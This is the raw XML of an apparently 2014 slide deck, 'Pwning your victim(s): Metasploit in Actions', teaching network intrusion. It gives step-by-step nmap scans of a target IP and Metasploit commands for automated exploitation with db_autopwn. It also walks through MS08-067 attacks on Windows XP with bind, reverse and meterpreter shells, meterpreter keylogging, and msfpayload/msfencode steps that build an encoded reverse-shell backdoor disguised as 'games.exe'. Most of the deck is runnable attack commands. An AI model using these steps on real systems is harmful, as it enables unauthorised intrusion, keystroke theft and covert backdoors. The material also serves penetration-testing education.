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paragraph-properties fo:margin-top="0.42cm" fo:margin-bottom="0.35cm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WNING YOUR VICTIM(s)</text:p>
          </draw:text-box>
        </draw:frame>
        <draw:frame presentation:style-name="pr2" draw:layer="layout" svg:width="25.199cm" svg:height="12.178cm" svg:x="1.4cm" svg:y="4.914cm" presentation:class="subtitle" presentation:user-transformed="true">
          <draw:text-box>
            <text:p><text:span text:style-name="T1">Metasploit in Actions</text:span></text:p>
            <text:p><text:span text:style-name="T2">By John Ombag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ckable Vbox setting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>Bridged Adapter (eth0)</text:p>
                <text:p>MAC ADD: 080027E40A80</text:p>
                <text:p>Promiscuous Mode: all</text:p>
                <text:p/>
                <text:p>IP Address: 192.168.193.76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“Know thy Enemy”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From the Attacking Point: </text:p>
              </text:list-item>
              <text:list-item>
                <text:p>We profile the victims system by</text:p>
                <text:p>-Identify running services and all open ports</text:p>
                <text:p>-identify the OS version of the target.</text:p>
                <text:p/>
              </text:list-item>
              <text:list-item>
                <text:p>If possible identify if there is an IDS/IPS present in the targets system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MAP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Nmap (king of all the scanners) will help us profile our target..</text:p>
              </text:list-item>
              <text:list-item>
                <text:p>To get open ports: </text:p>
                <text:p><text:span text:style-name="T3">nmap -p0-65500 192.168.193.76 </text:span></text:p>
                <text:p><text:span text:style-name="T4">0-65500 is the port range</text:span></text:p>
              </text:list-item>
              <text:list-item>
                <text:p><text:span text:style-name="T3">nmap -sS -Pn -A -T4 -vv 192.168.193.76 </text:span></text:p>
                <text:p><text:span text:style-name="T3">-sS:</text:span><text:span text:style-name="T4"> TCP SYN scan Very fast and stealthy. Half-open scan</text:span></text:p>
                <text:p><text:span text:style-name="T3">-Pn:</text:span><text:span text:style-name="T4"> We stop this action for sending out a pingrequest</text:span></text:p>
                <text:p><text:span text:style-name="T3">-A:</text:span><text:span text:style-name="T4"> Aggressive Initiates many options at once such as version and script scanning. Use with caution.</text:span></text:p>
                <text:p><text:span text:style-name="T3">-T (0-5):</text:span><text:span text:style-name="T4"> Timing options Determines how aggressive you want the scan to be.</text:span></text:p>
                <text:p><text:span text:style-name="T3">-v: </text:span><text:span text:style-name="T4">verbose </text:span></text:p>
                <text:p><text:span text:style-name="T4"/></text:p>
              </text:list-item>
            </text:list>
          </draw:text-box>
        </draw:frame>
        <draw:frame draw:style-name="gr2" draw:text-style-name="P1" draw:layer="layout" svg:width="4.27cm" svg:height="0.65cm" svg:x="12.034cm" svg:y="10.375cm">
          <draw:text-box>
            <text:p text:style-name="P1">nmap -sS -Pn -A -T4 -vv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tasploit+Nmap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Metasploit by default uses Postgresql DB</text:p>
              </text:list-item>
              <text:list-item>
                <text:p>In other older versions of MSF you could connect to a different DB as long as the drivers to connect are available. Eg: </text:p>
                <text:p><text:span text:style-name="T3">msf &gt; db_driver sqlite3</text:span></text:p>
                <text:p><text:span text:style-name="T3">msf &gt; db_connect </text:span></text:p>
                <text:p><text:span text:style-name="T3"/></text:p>
              </text:list-item>
              <text:list-item>
                <text:p><text:span text:style-name="T5">With a DB loaded, you can use db_nmap function in metasploit to scan and save hosts with their services in MSF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weaking Kali Linux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While working with Kali Linux, there are some few tweaks you have to make.</text:p>
                <text:p/>
              </text:list-item>
              <text:list-item>
                <text:p>The Database service is by default inactive:</text:p>
                <text:p><text:span text:style-name="T3">#service postgresql start </text:span></text:p>
                <text:p><text:span text:style-name="T6">running above command starts the postgres DB</text:span></text:p>
                <text:p><text:span text:style-name="T6"/></text:p>
              </text:list-item>
              <text:list-item>
                <text:p><text:span text:style-name="T6">The metasploit service to work with the DB should be started </text:span></text:p>
                <text:p><text:span text:style-name="T7">#service metasploit start</text:span></text:p>
                <text:p><text:span text:style-name="T7"/></text:p>
                <text:p><text:span text:style-name="T7">P.s. you can configure this services to launch at startup</text:span></text:p>
                <text:p><text:span text:style-name="T6">After launching these services, go ahead and start the mfsconso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anning...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Once MSF is connected to the DB, we can use db_nmap function to scan our targets with the usual nmap options and save our results..</text:p>
                <text:p><text:span text:style-name="T8">load db_tracker</text:span></text:p>
                <text:p><text:span text:style-name="T8">db_nmap -T Aggressive -sV -n -O -v 192.168.193.76</text:span></text:p>
                <text:p><text:span text:style-name="T8">db_hosts </text:span><text:span text:style-name="T9">(show found hosts)</text:span></text:p>
                <text:p><text:span text:style-name="T8">db_services </text:span><text:span text:style-name="T9">(shows found services)</text:span></text:p>
              </text:list-item>
              <text:list-item>
                <text:p><text:span text:style-name="T9">you can import those results into Metasploit using the</text:span></text:p>
                <text:p><text:span text:style-name="T8">db_import_nmap_xml</text:span><text:span text:style-name="T9"> func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Auto Pawning!</text:p>
              </text:list-header>
            </text:list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header>
                <text:p>We can take output from the NMap scanner and pass it as an input to the <text:span text:style-name="T10">db_autopwn</text:span> (automated exploitation )</text:p>
                <text:p/>
                <text:p><text:span text:style-name="T10">&gt; db_services (result of scanned services)</text:span></text:p>
                <text:p><text:span text:style-name="T10">&gt; db_autopwn -h (shows help)</text:span></text:p>
                <text:p><text:span text:style-name="T10">&gt; db_autopwn -p -t -e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ind Shell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A remote shell connection giving us access to the victim machine once the exploitation and execution of shellcode goes well.</text:p>
              </text:list-item>
              <text:list-item>
                <text:p>This is achieved by setting up a bind port listener in victim system.</text:p>
              </text:list-item>
              <text:list-item>
                <text:p>eg (attacking Windows XP [Version 5.1.2600])</text:p>
              </text:list-item>
              <text:list-item>
                <text:p><text:span text:style-name="T10">msf &gt; use exploit/windows/smb/ms08_067_netapi</text:span></text:p>
              </text:list-item>
              <text:list-item>
                <text:p><text:span text:style-name="T10">msf exploit(ms08_067_netapi) &gt; show options</text:span></text:p>
              </text:list-item>
              <text:list-item>
                <text:p><text:span text:style-name="T10">msf exploit(ms08_067_netapi) &gt; set RHOST 192.168.193.76</text:span></text:p>
              </text:list-item>
              <text:list-item>
                <text:p><text:span text:style-name="T10">msf exploit(ms08_067_netapi) &gt; set PAYLOAD windows/shell/bind_tcp</text:span></text:p>
              </text:list-item>
              <text:list-item>
                <text:p><text:span text:style-name="T10">msf exploit(ms08_067_netapi) &gt; exploi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verse Shell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>Instead of binding a port on a target system and waiting for the connection from the attacker's machine, it simply connects-back to the attacker's IP and Port, and spawns a shell.</text:p>
              </text:list-header>
              <text:list-item>
                <text:p>Eg: attacking Microsoft Windows XP [Version 5.1.2600]</text:p>
              </text:list-item>
              <text:list-item>
                <text:p><text:span text:style-name="T10">msf &gt; use exploit/windows/smb/ms08_067_netapi</text:span></text:p>
              </text:list-item>
              <text:list-item>
                <text:p><text:span text:style-name="T10">msf exploit(ms08_067_netapi) &gt; set RHOST 192.168.0.7</text:span></text:p>
              </text:list-item>
              <text:list-item>
                <text:p><text:span text:style-name="T10">msf exploit(ms08_067_netapi) &gt; set PAYLOAD windows/shell/reverse_tcp</text:span></text:p>
              </text:list-item>
              <text:list-item>
                <text:p><text:span text:style-name="T10">msf exploit(ms08_067_netapi) &gt; show options</text:span></text:p>
              </text:list-item>
              <text:list-item>
                <text:p><text:span text:style-name="T10">msf exploit(ms08_067_netapi) &gt; set LHOST 192.168.0.3 </text:span></text:p>
              </text:list-item>
              <text:list-item>
                <text:p><text:span text:style-name="T10">msf exploit(ms08_067_netapi) &gt; exploi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yloads (Inline/Stagers)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An <text:span text:style-name="T10">inline payload</text:span> is a single self-contained shell code that is to be executed with one instance of an exploit.</text:p>
              </text:list-item>
              <text:list-item>
                <text:p><text:span text:style-name="T10">Stager payload</text:span> creates a communication channel between the attacker and victim machine to read-off the rest of the staging shell code to perform the specific task.</text:p>
                <text:p/>
              </text:list-item>
              <text:list-item>
                <text:p><text:span text:style-name="T3">TIP: in most cases use stager payloads because they are much smaller in size than inline payload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eterprete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>Its an advanced, stealthy, multifaceted, and dynamically extensible payload which operates by injecting reflective DLL into a target memory. (source: wiki) meterpreter shell is encrypted by default.</text:p>
              </text:list-header>
              <text:list-item>
                <text:p>Best for Post-exploitation Activities like privilege escalation, dumping system, accounts, keylogging, persistent backdoor service, enabling rdesktop etc</text:p>
              </text:list-item>
              <text:list-item>
                <text:p>Eg:</text:p>
              </text:list-item>
              <text:list-item>
                <text:p><text:span text:style-name="T10">msf &gt; use exploit/windows/smb/ms08_067_netapi</text:span></text:p>
              </text:list-item>
              <text:list-item>
                <text:p><text:span text:style-name="T10">msf exploit(ms08_067_netapi) &gt; set RHOST 192.168.193.76</text:span></text:p>
              </text:list-item>
              <text:list-item>
                <text:p><text:span text:style-name="T10">msf exploit(ms08_067_netapi) &gt; show payloads</text:span></text:p>
              </text:list-item>
              <text:list-item>
                <text:p><text:span text:style-name="T10">msf exploit(ms08_067_netapi) &gt; set PAYLOAD windows/meterpreter/reverse_tcp</text:span></text:p>
              </text:list-item>
              <text:list-item>
                <text:p><text:span text:style-name="T10">msf exploit(ms08_067_netapi) &gt; show options</text:span></text:p>
              </text:list-item>
              <text:list-item>
                <text:p><text:span text:style-name="T10">msf exploit(ms08_067_netapi) &gt; set LHOST 192.168.193.x</text:span></text:p>
              </text:list-item>
              <text:list-item>
                <text:p><text:span text:style-name="T10">msf exploit(ms08_067_netapi) &gt; exploi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terpreter basic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Once you have a meterpreter shell, use “help” to view commands you can use.</text:p>
                <text:p><text:span text:style-name="T3">help background cat cd &amp; pwd clearev <text:s/>download <text:s/>edit <text:s/>execute getuid hashdump idletime ipconfig lpwd &amp; lcd ls migrate ps resource search shell upload webcam_list webcam_snap </text:span><text:span text:style-name="T5">and others</text:span></text:p>
              </text:list-item>
              <text:list-item>
                <text:p><text:a xlink:href="http://www.offensive-security.com/metasploit-unleashed/Meterpreter_Basics" xlink:type="simple">http://www.offensive-security.com/metasploit-unleashed/Meterpreter_Basics</text:a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eylogging....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In the meterpreter session, you can hook your session to a higher process that can enable you get the inputs from the user keyboard..</text:p>
                <text:p><text:span text:style-name="T10">ps </text:span><text:span text:style-name="T11">(lists all running process with their id)</text:span></text:p>
                <text:p><text:span text:style-name="T10">migrate 3172 </text:span><text:span text:style-name="T11">(hooks to a different process)</text:span></text:p>
                <text:p><text:span text:style-name="T10">keyscan_start </text:span><text:span text:style-name="T11">(starts to monitor inputs)</text:span></text:p>
                <text:p><text:span text:style-name="T10">keyscan_dump</text:span><text:span text:style-name="T11"> (logs key inputs)</text:span></text:p>
                <text:p><text:span text:style-name="T10">keyscan_stop </text:span><text:span text:style-name="T11">(stops the monitoring process)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inued..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Creating the same executable in MSF</text:p>
              </text:list-item>
              <text:list-item>
                <text:p><text:span text:style-name="T10">msf &gt; use exploit/multi/handler</text:span></text:p>
              </text:list-item>
              <text:list-item>
                <text:p><text:span text:style-name="T10">msf exploit(handler) &gt; set PAYLOAD windows/shell_reverse_tcp</text:span></text:p>
              </text:list-item>
              <text:list-item>
                <text:p><text:span text:style-name="T10">msf exploit(handler) &gt; show options</text:span></text:p>
              </text:list-item>
              <text:list-item>
                <text:p><text:span text:style-name="T10">msf exploit(handler) &gt; set LHOST 192.168.193.x</text:span></text:p>
              </text:list-item>
              <text:list-item>
                <text:p><text:span text:style-name="T10">msf exploit(handler) &gt; set LPORT 4444</text:span></text:p>
              </text:list-item>
              <text:list-item>
                <text:p><text:span text:style-name="T10">msf exploit(handler) &gt; exploi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auty of msfcli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I can create the same payload and pipe it to msfencode and get an encode of the same payload maybe for a different target!</text:p>
              </text:list-item>
              <text:list-item>
                <text:p>Kali msf dir (/usr/share/metasploit)</text:p>
              </text:list-item>
              <text:list-item>
                <text:p><text:span text:style-name="T10">./msfpayload windows/shell/reverse_tcp LHOST=192.168.193.x LPORT=4444 R | ./msfencode -e x86/shikata_ga_nai -t exe &gt; /tmp/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ient Side Exploitatio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using msfpayload we can generate an independent backdoor executable file which can act a selected Metasploit payload service.</text:p>
              </text:list-item>
              <text:list-item>
                <text:p><text:span text:style-name="T10"># ./msfpayload -h</text:span><text:span text:style-name="T11"> (in msf dir, shows help)</text:span></text:p>
                <text:p><text:span text:style-name="T10"/></text:p>
              </text:list-item>
              <text:list-item>
                <text:p><text:span text:style-name="T8"># ./msfpayload windows/shell_reverse_tcp LHOST=192.168.193.79 LPORT=4444 X &gt; /tmp/games.exe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EMO(s)!</text:p>
          </draw:text-box>
        </draw:frame>
        <draw:frame presentation:style-name="pr4" draw:layer="layout" svg:width="25.199cm" svg:height="12.178cm" svg:x="1.217cm" svg:y="4.572cm" presentation:class="outline" presentation:user-transformed="true">
          <draw:text-box>
            <text:list text:style-name="L3">
              <text:list-header>
                <text:p text:style-name="P2">John Ombagi</text:p>
              </text:list-header>
              <text:list-item>
                <text:p text:style-name="P2">Twitter: @johntroony</text:p>
              </text:list-item>
              <text:list-item>
                <text:p text:style-name="P2">Blog: <text:a xlink:href="http://www.promaxted.com/" xlink:type="simple">www.promaxted.com</text:a></text:p>
                <text:p text:style-name="P2"/>
              </text:list-item>
              <text:list-item>
                <text:p text:style-name="P2">Email: <text:a xlink:href="mailto:ombagi@promaxted.com" xlink:type="simple">ombagi@promaxted.com</text:a> </text:p>
                <text:p text:style-name="P2">(spammers) <text:a xlink:href="mailto:ombagi@outlook.com" xlink:type="simple">ombagi@outlook.com</text:a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Troon</meta:initial-creator>
    <meta:creation-date>2014-03-13T09:56:55.184995256</meta:creation-date>
    <dc:date>2014-03-13T11:22:34.102563397</dc:date>
    <dc:creator>John Troon</dc:creator>
    <meta:editing-duration>PT6M49S</meta:editing-duration>
    <meta:editing-cycles>1</meta:editing-cycles>
    <meta:document-statistic meta:object-count="94"/>
    <meta:generator>LibreOffice/4.1.3.2$Linux_x86 LibreOffice_project/410m0$Build-2</meta:generator>
  </office:meta>
</office:document-meta>
</file>